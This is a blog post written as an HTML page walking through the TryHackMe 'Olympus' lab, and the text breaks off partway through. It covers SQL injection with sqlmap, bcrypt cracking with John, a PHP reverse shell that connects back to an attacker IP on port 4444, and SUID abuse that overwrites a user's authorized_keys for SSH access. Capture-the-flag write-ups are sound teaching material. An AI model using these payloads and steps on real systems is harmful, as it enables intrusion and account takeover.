@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Olympus Writeup — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="A hands-on TryHackMe Olympus walkthrough covering Nmap reconnaissance, virtual-host discovery, SQL injection, credential cracking, chat application enumeration, PHP reverse-shell access, SUID abuse, SSH access, and privilege escalation to root.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/olympus-thm-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Olympus Writeup">
+  <meta property="og:description" content="A hands-on TryHackMe Olympus walkthrough covering Nmap reconnaissance, virtual-host discovery, SQL injection, credential cracking, chat application enumeration, PHP reverse-shell access, SUID abuse, SSH access, and privilege escalation to root.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/olympus-thm-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-10-03T17:24:45.118Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="privilege-escalation">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Olympus Writeup">
+  <meta name="twitter:description" content="A hands-on TryHackMe Olympus walkthrough covering Nmap reconnaissance, virtual-host discovery, SQL injection, credential cracking, chat application enumeration, PHP reverse-shell access, SUID abuse, SSH access, and privilege escalation to root.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Olympus Writeup","description":"A hands-on TryHackMe Olympus walkthrough covering Nmap reconnaissance, virtual-host discovery, SQL injection, credential cracking, chat application enumeration, PHP reverse-shell access, SUID abuse, SSH access, and privilege escalation to root.","datePublished":"2026-10-03T17:24:45.118Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/olympus-thm-writeup/","keywords":"ctf, pentesting, web-security, post-exploitation, privilege-escalation"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-olympus-thm-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Olympus Writeup</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 20_09_2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">privilege-escalation</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<h1>TryHackMe: Olympus</h1>
+<p><strong>Room:</strong> <a href="https://tryhackme.com/room/olympusroom">Olympus</a></p>
+<p><strong>Platform:</strong> TryHackMe</p>
+<p><strong>Difficulty:</strong> As listed on TryHackMe</p>
+<p><strong>Target IP:</strong> <code>10.49.129.47</code> (used during the later stages of my attack)</p>
+<h2>1. Initial Reconnaissance</h2>
+<p>We will start by scanning the target machine using Nmap to identify open ports, running services, and other useful information.</p>
+<pre><code class="language-bash">nmap -sV -sC TARGET_IP
+</code></pre>
+<img width="1002" height="502" alt="Screenshot 2026-09-15 142233" src="https://github.com/user-attachments/assets/009e5265-eaf6-4784-bbfb-b052b35e6368" />
+
+
+<p>The scan reveals two open ports:</p>
+<ul>
+<li><code>22/tcp</code> - SSH</li>
+<li><code>80/tcp</code> - HTTP</li>
+</ul>
+<p>The Nmap script scan also reveals the following:</p>
+<pre><code class="language-text">http-title: Did not follow redirect to http://olympus.thm
+</code></pre>
+<p>This indicates that the web server redirects requests to the hostname <code>olympus.thm</code>.</p>
+<p>Since we do not have a DNS server resolving this hostname in our lab environment, we need to add an entry to our local hosts file.</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>Add the following entry:</p>
+<pre><code class="language-text">TARGET_IP olympus.thm
+</code></pre>
+<p>Replace <code>TARGET_IP</code> with the target machine&#39;s IP address.</p>
+<img width="804" height="412" alt="Screenshot 2026-09-15 142532" src="https://github.com/user-attachments/assets/9f0cfc5d-a356-475d-94ba-a0dea9bebb66" />
+
+
+<h2>2. Exploring the Web Application</h2>
+<p>Now let&#39;s visit the website:</p>
+<p><code>http://olympus.thm</code></p>
+<img width="931" height="748" alt="Screenshot 2026-09-15 142636" src="https://github.com/user-attachments/assets/552d5cc3-ecb1-4dde-8033-0a795b083b85" />
+
+
+<p>The website indicates that it is under development.</p>
+<p>Instead of stopping here, we will enumerate the web server to discover additional directories and files.</p>
+<h3>Directory Enumeration</h3>
+<p>We will use Gobuster with the common directory wordlist.</p>
+<pre><code class="language-bash">gobuster dir -u http://olympus.thm -w /usr/share/dirb/wordlists/common.txt --no-error -x bak,js,php,txt,html
+</code></pre>
+<img width="1150" height="863" alt="Screenshot 2026-09-15 150310" src="https://github.com/user-attachments/assets/3bb6a4aa-f3f3-4743-a6c1-b0d78a0ce37b" />
+
+
+<p>The scan discovers several files and directories. Some of the discovered files return HTTP 403 Forbidden.</p>
+<p>Before attempting to bypass those restrictions, let&#39;s inspect the directories that are accessible.</p>
+<p>One interesting discovery is:</p>
+<p><code>http://olympus.thm/webmaster/</code></p>
+<p>This directory returns HTTP 200, meaning the resource is accessible.</p>
+<img width="1361" height="801" alt="Screenshot 2026-09-15 150817" src="https://github.com/user-attachments/assets/ec8a7fbd-d299-4dc4-9c87-88ab238c693c" />
+
+
+<p>The website looks somewhat like WordPress, but further inspection reveals that it uses <strong>Victor CMS</strong>.</p>
+<p>I also tried searching for information about this CMS, including known vulnerabilities and misconfigurations. However, I could not find much useful information about it. It may be a fictional or lab-specific CMS.</p>
+<p>The page also contains a search box and a login section. These provide potential entry points for further testing.</p>
+<h2>3. SQL Injection in the Search Functionality</h2>
+<p>Let&#39;s start testing the search functionality.</p>
+<img width="337" height="373" alt="Screenshot 2026-09-15 150855" src="https://github.com/user-attachments/assets/1978e635-a5cd-41dc-bb24-c3d18eecf3e3" />
+
+
+<p>I tried entering a single quotation mark (<code>&#39;</code>) into the search box.</p>
+<img width="408" height="270" alt="Screenshot 2026-09-15 150904" src="https://github.com/user-attachments/assets/97172730-1784-4707-b6e3-37b37f8a01aa" />
+
+
+<p>The application returned an error.</p>
+<img width="954" height="473" alt="Screenshot 2026-09-15 150924" src="https://github.com/user-attachments/assets/66748353-f293-4a07-8351-f285d30f0451" />
+
+
+<p>This is a potential indication of SQL injection. The error message also reveals that the application is using <strong>MySQL</strong>.</p>
+<p>However, an error alone is not sufficient to establish exploitability. We need to investigate further.</p>
+<h3>Capturing the Request with Burp Suite</h3>
+<p>We will intercept a search request using Burp Suite.</p>
+<ol>
+<li>Enable Burp interception.</li>
+<li>Enter a test search term into the application&#39;s search box.</li>
+<li>Submit the request.</li>
+<li>Forward or capture the request.</li>
+<li>Save the request to a file named <code>req</code>.</li>
+</ol>
+<p>We can now use the captured request as input for SQLmap.</p>
+<h3>Enumerating Databases</h3>
+<pre><code class="language-bash">sqlmap -r req -dbms=mysql --dbs
+</code></pre>
+<img width="1585" height="707" alt="Screenshot 2026-09-16 125548" src="https://github.com/user-attachments/assets/f76a8f41-719d-4dd8-97ff-78baf8819140" />
+
+
+<p>SQLmap successfully extracts database information, confirming that the search functionality is vulnerable to SQL injection.</p>
+<p>The database named <code>olympus</code> is particularly interesting.</p>
+<h3>Enumerating Tables</h3>
+<p>Let&#39;s enumerate the tables inside the <code>olympus</code> database.</p>
+<pre><code class="language-bash">sqlmap -r req -D olympus --tables -dbms=mysql
+</code></pre>
+<img width="1194" height="431" alt="Screenshot 2026-09-16 130656" src="https://github.com/user-attachments/assets/83730b0e-2092-47c3-95f8-1f2a3e3ca8c5" />
+
+
+<p>Among the discovered tables are:</p>
+<ul>
+<li><code>flag</code></li>
+<li><code>users</code></li>
+<li><code>chat</code></li>
+</ul>
+<p>We will investigate these tables individually.</p>
+<h3>Dumping the First Flag</h3>
+<p>The <code>flag</code> table looks interesting, so let&#39;s dump its contents.</p>
+<pre><code class="language-bash">sqlmap -r req -D olympus -T flag -dbms=mysql --dump
+</code></pre>
+<img width="603" height="234" alt="image" src="https://github.com/user-attachments/assets/e9e5eed8-854e-43cf-89b9-b0c54ea66791" />
+
+
+
+<p>We successfully retrieve the <strong>first flag</strong>.</p>
+<h3>Dumping User Information</h3>
+<p>Next, let&#39;s inspect the <code>users</code> table.</p>
+<pre><code class="language-bash">sqlmap -r req -D olympus -T users -dbms=mysql --dump
+</code></pre>
+<img width="1913" height="262" alt="Screenshot 2026-09-16 160156" src="https://github.com/user-attachments/assets/6f7222d7-f245-4983-bf8a-2ad07138b3a0" />
+
+
+<p>The table contains three users, along with their email addresses and password hashes.</p>
+<p>The hashes are bcrypt hashes.</p>
+<p>Bcrypt is designed to make password cracking computationally expensive, so cracking these hashes may take some time depending on the password strength and available resources.</p>
+<h2>4. Cracking the Password Hashes</h2>
+<p>We will save the three hashes into a file named <code>hashes.txt</code>, with one hash per line.</p>
+<pre><code class="language-bash">nano hashes.txt
+</code></pre>
+<p>Paste the hashes into the file and save it.</p>
+<p>Now use John the Ripper to attempt to crack the hashes using the RockYou wordlist.</p>
+<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt
+</code></pre>
+<p>John will display its progress while processing the hashes. After a few minutes, you may see output similar to this:</p>
+<pre><code class="language-text">g 0:00:00:04 0.26% 2/3 (ETA: 17:04:30) 0g/s 96.11p/s 200.9c/s 200.9C/s nelson..teresa
+</code></pre>
+<p>To check whether any passwords have been recovered, run:</p>
+<pre><code class="language-bash">john --show hashes.txt
+</code></pre>
+<img width="600" height="130" alt="image" src="https://github.com/user-attachments/assets/f3e749a7-3e98-4c6b-994c-aa822b53a5ab" />
+
+
+
+
+<p>The recovered password corresponds to the user <code>prometheus</code>, who appears first in the dumped users table.</p>
+<p>The password itself is omitted from this writeup.</p>
+<h2>5. Accessing the Administrator Panel</h2>
+<p>Now that we have recovered credentials, let&#39;s return to the web application.</p>
+<p>Use the recovered credentials in the login section.</p>
+<p>After logging in, we gain access to an administrator page.</p>
+<img width="1498" height="821" alt="Screenshot 2026-09-16 154312" src="https://github.com/user-attachments/assets/af74005e-2a55-4326-b231-5c1394549b67" />
+
+
+<p>The panel allows us to create and delete posts and manage parts of the website.</p>
+<p>I explored the available functionality but did not immediately find another useful entry point.</p>
+<p>However, we still have information from the SQL injection that we have not investigated: the users&#39; email addresses.</p>
+<p>One of those email addresses provides a clue about another hostname.</p>
+<h2>6. Discovering the Chat Application</h2>
+<p>The email information suggests that the application has another service running under the hostname:</p>
+<p><code>chat.olympus.thm</code></p>
+<p>In this lab, we need to resolve the hostname locally rather than relying on public DNS.</p>
+<p>Add another entry to <code>/etc/hosts</code>:</p>
+<pre><code class="language-text">TARGET_IP chat.olympus.thm
+</code></pre>
+<img width="722" height="430" alt="Screenshot 2026-09-16 160241" src="https://github.com/user-attachments/assets/f3d46777-956f-42df-ab0d-b6f7869eaa80" />
+
+
+<p>Now visit:</p>
+<p><code>http://chat.olympus.thm/</code></p>
+<img width="1008" height="657" alt="Screenshot 2026-09-16 160317" src="https://github.com/user-attachments/assets/05e238cc-05fb-4ec5-909b-6364453ec940" />
+
+
+<p>We discover a login page for a chat platform.</p>
+<p>Let&#39;s try the credentials recovered earlier through SQL injection.</p>
+<p>After logging in, we can access the chat interface and read conversations.</p>
+<img width="1332" height="810" alt="Screenshot 2026-09-16 160438" src="https://github.com/user-attachments/assets/7f836eb6-fc56-4f71-94f5-6a2dcc22b279" />
+
+
+<h3>Investigating the Chat Logs</h3>
+<p>The chat messages reveal an interesting implementation detail.</p>
+<p>An IT employee mentions that uploaded files are assigned random filenames.</p>
+<p>This is important because it means that simply uploading a file and guessing its original filename will not necessarily allow us to access it.</p>
+<p>The chat interface also contains a text file that we can investigate later.</p>
+<h2>7. Enumerating the Chat Application</h2>
+<p>Let&#39;s enumerate the chat application&#39;s directories using Gobuster.</p>
+<pre><code class="language-bash">gobuster dir -u http://chat.olympus.thm/ -w /usr/share/dirb/wordlists/common.txt --no-error -x bak,js,php,txt,html
+</code></pre>
+<img width="1043" height="341" alt="Screenshot 2026-09-16 161354" src="https://github.com/user-attachments/assets/c35b4195-e3c7-4c57-8b2c-d9e24de6af04" />
+
+
+<p>One interesting discovery is:</p>
+<p><code>http://chat.olympus.thm/uploads/</code></p>
+<p>Let&#39;s visit the uploads directory.</p>
+<p>The directory displays an image, but nothing immediately useful is visible.</p>
+<h3>Testing File Upload Behavior</h3>
+<p>I also uploaded a PHP reverse shell to investigate whether uploaded PHP files could be executed.</p>
+<p>The reverse shell used was:</p>
+<pre><code class="language-php">&lt;?php
+$sock = fsockopen(&quot;192.168.134.12&quot;, 4444);
+$proc = proc_open(&quot;/bin/bash -i&quot;, [
+    0 =&gt; $sock,
+    1 =&gt; $sock,
+    2 =&gt; $sock
+], $pipes);
+?&gt;
+</code></pre>
+<p>I saved the payload as:</p>
+<pre><code class="language-text">shell.php
+</code></pre>
+<p>The IP address in the payload is the address of my attacking machine and should be replaced with the appropriate reachable address when reproducing the test.</p>
+<p>After uploading the file, I attempted to access:</p>
+<p><code>http://chat.olympus.thm/uploads/shell.php</code></p>
+<p>However, the expected shell did not execute.</p>
+<p>This is consistent with the information from the chat logs: uploaded files are renamed, so the original filename is not preserved.</p>
+<p>We need to discover the actual filename assigned to our upload.</p>
+<h2>8. Recovering Uploaded Filenames Through SQL Injection</h2>
+<p>Remember the <code>chat</code> table we discovered earlier?</p>
+<p>Let&#39;s dump it.</p>
+<pre><code class="language-bash">sqlmap -r req -D olympus -T chat --dump -dbms=mysql
+</code></pre>
+<img width="1912" height="694" alt="Screenshot 2026-09-16 161643" src="https://github.com/user-attachments/assets/3fc05259-4184-470c-a305-8b889b39de9a" />
+
+
+<p>The dumped chat records contain useful information, including messages and uploaded filenames.</p>
+<p>We can identify the renamed PHP file corresponding to our upload:</p>
+<pre><code class="language-text">8e830cdc9623916595bd6b3d5b203fc.php
+</code></pre>
+<p>The text file mentioned earlier also has a generated filename:</p>
+<pre><code class="language-text">47c3210d51761686f3af40a875eeaaea.txt
+</code></pre>
+<img width="1102" height="233" alt="Screenshot 2026-09-16 161742" src="https://github.com/user-attachments/assets/6696b79a-e486-4b10-96c2-080b79a5ad72" />
+
+
+<p>The text file did not contain anything particularly useful during my investigation.</p>
+<p>Now we know the actual filename assigned to the PHP upload.</p>
+<h2>9. Obtaining a Reverse Shell</h2>
+<p>Start a Netcat listener on the attacking machine:</p>
+<pre><code class="language-bash">nc -lvnp 4444
+</code></pre>
+<p>Next, trigger the uploaded PHP file using its renamed filename:</p>
+<p><code>http://chat.olympus.thm/uploads/8e830cdc9623916595bd6b3d5b203fc.php</code></p>
+<p>If the payload executes successfully and the target can reach the listener, we should receive a connection.</p>
+<p>We now have an initial shell on the target.</p>
+<h3>Initial Post-Exploitation Enumeration</h3>
+<p>After obtaining the shell, I performed basic post-exploitation enumeration to understand the compromised environment.</p>
+<p>This included checking:</p>
+<ul>
+<li>The current user and group memberships.</li>
+<li>The current working directory.</li>
+<li>Accessible files and directories.</li>
+<li>Running processes.</li>
+<li>System information.</li>
+<li>Potential privilege-escalation paths.</li>
+</ul>
+<p>During this stage, I also retrieved the <strong>user flag</strong> from the Zeus user&#39;s home directory.</p>
+<pre><code class="language-text">/home/zeus/user.flag
+</code></pre>
+<img width="576" height="216" alt="image" src="https://github.com/user-attachments/assets/e3ac7858-a6e5-4ff3-b461-25443aff5008" />
+
+
+
+<p>With the user flag obtained, the next objective is privilege escalation.</p>
+<h2>10. Linux Privilege Escalation</h2>
+<p>Let&#39;s enumerate SUID binaries on the target.</p>
+<p>SUID executables can run with the privileges of their file owner. A poorly implemented or misconfigured SUID program may therefore provide a privilege-escalation opportunity.</p>
+<p>Run:</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<img width="494" height="188" alt="Screenshot 2026-09-17 151414" src="https://github.com/user-attachments/assets/ddf9597b-600a-4b9f-8509-2f51fa187fbd" />
+
+
+<p>Among the results, we discover an interesting executable:</p>
+<pre><code class="language-text">/usr/bin/cputils
+</code></pre>
+<p>Let&#39;s investigate its behavior.</p>
+<pre><code class="language-bash">/usr/bin/cputils
+</code></pre>
+<p>During my investigation, I found that <code>cputils</code> could write file contents to a destination and overwrite existing files.</p>
+<p>This behavior becomes particularly interesting when combined with its SUID permissions.</p>
+<h3>Investigating Zeus&#39;s Files</h3>
+<p>I also inspected:</p>
+<pre><code class="language-text">/home/zeus/zeus.txt
+</code></pre>
+<img width="754" height="555" alt="Screenshot 2026-09-17 151430" src="https://github.com/user-attachments/assets/0ca7c5d4-0424-4019-88b3-07c7a8be7eed" />
+
+
+<p>The file contains a message indicating that the machine had previously been compromised.</p>
+<p>This adds some context to the lab&#39;s fictional scenario.</p>
+<h3>Investigating the SSH Key</h3>
+<p>Next, I investigated the SSH-related files belonging to Zeus.</p>
+<img width="795" height="493" alt="Screenshot 2026-09-17 153419" src="https://github.com/user-attachments/assets/cadb48c0-ca61-4db8-ad75-caea0ebfb2de" />
+
+
+<p>I attempted to crack the SSH private key using John the Ripper.</p>
+<p>First, convert the key into a format John can process:</p>
+<pre><code class="language-bash">ssh2john id_rsa &gt; hash.txt
+</code></pre>
+<p>Then run:</p>
+<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre>
+<img width="672" height="535" alt="Screenshot 2026-09-17 153448" src="https://github.com/user-attachments/assets/29a058b0-e0b1-4a31-b868-f941ee58c1f6" />
+
+
+<p>Although I recovered information from the key, I could not get the original key to work for SSH authentication.</p>
+<p>Instead of spending more time troubleshooting that key, I decided to generate a new SSH key pair and investigate whether the SUID binary could be used to modify Zeus&#39;s authorized keys.</p>
+<h2>11. Exploiting cputils for SSH Access</h2>
+<p>Generate a new RSA key pair on the attacking machine.</p>
+<pre><code class="language-bash">ssh-keygen -t rsa -f attack_key
+</code></pre>
+<img width="893" height="493" alt="Screenshot 2026-09-17 154153" src="https://github.com/user-attachments/assets/3d90906d-f43d-4f65-925a-9764fb3cd865" />
+
+
+<p>This creates two files:</p>
+<pre><code class="language-text">attack_key
+attack_key.pub
+</code></pre>
+<p>The private key is <code>attack_key</code>, while <code>attack_key.pub</code> contains the public key.</p>
+<p>Display the public key:</p>
+<pre><code class="language-bash">cat attack_key.pub
+</code></pre>
+<p>We need to transfer the public key to the target.</p>
+<p>First, set appropriate permissions on the private key:</p>
+<pre><code class="language-bash">chmod 600 attack_key
+</code></pre>
+<p>Start a simple HTTP server in the directory containing the public key:</p>
+<pre><code class="language-bash">python3 -m http.server 8000
+</code></pre>
+<p>On the target machine, download the public key into <code>/tmp</code>:</p>
+<pre><code class="language-bash">wget http://YOUR_IP:8000/attack_key.pub -O /tmp/attack_key.pub
+</code></pre>
+<p>Replace <code>YOUR_IP</code> with the reachable IP address of your attacking machine.</p>
+<h3>Modifying authorized_keys</h3>
+<p>We can now use the discovered behavior of <code>cputils</code> to overwrite Zeus&#39;s SSH authorized-keys file with our public key.</p>
+<p>The target file is:</p>
+<pre><code class="language-text">/home/zeus/.ssh/authorized_keys
+</code></pre>
+<img width="750" height="356" alt="Screenshot 2026-09-17 155332" src="https://github.com/user-attachments/assets/e1df811f-4b37-4f6d-8051-95fcc12b8183" />
+
+
+<p>The objective is to make our public key an accepted authentication key for Zeus.</p>
+<p>Once the modification succeeds, attempt to connect over SSH.</p>
+<pre><code class="language-bash">ssh -i attack_key zeus@TARGET_IP
+</code></pre>
+<img width="1021" height="572" alt="Screenshot 2026-09-17 155402" src="https://github.com/user-attachments/assets/222778e1-e064-4245-8a37-1376dfb79aea" />
+
+
+<p>We successfully obtain an SSH session as <code>zeus</code>.</p>
+<p>This gives us a more stable shell and allows us to investigate directories that were inaccessible during the initial web-shell session.</p>
+<h2>12. Discovering the Root Privilege-Escalation Path</h2>
+<p>During the earlier enumeration, I identified a directory that I could not access as the initial compromised account:</p>
+<pre><code class="language-text">/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
+</code></pre>
+<img width="776" height="153" alt="Screenshot 2026-09-17 162435" src="https://github.com/user-attachments/assets/7a7eb1fd-eac0-47ee-b0c5-523eb4c07deb" />
+Now that we have a Zeus SSH session, let's inspect it.
+
+<img width="1595" height="832" alt="Screenshot 2026-09-17 163457" src="https://github.com/user-attachments/assets/94e0df34-ed35-459f-80f3-f3cdacc6e53d" />
+
+
+<p>Inside the directory, we discover a PHP file containing another reverse-shell mechanism.</p>
+<p>The script is designed to establish a remote connection and execute a command that interacts with a specially placed SUID binary.</p>
+<h3>Understanding the PHP Script</h3>
+<p>The script&#39;s behavior can be broken down into several stages.</p>
+<p><strong>Entry</strong></p>
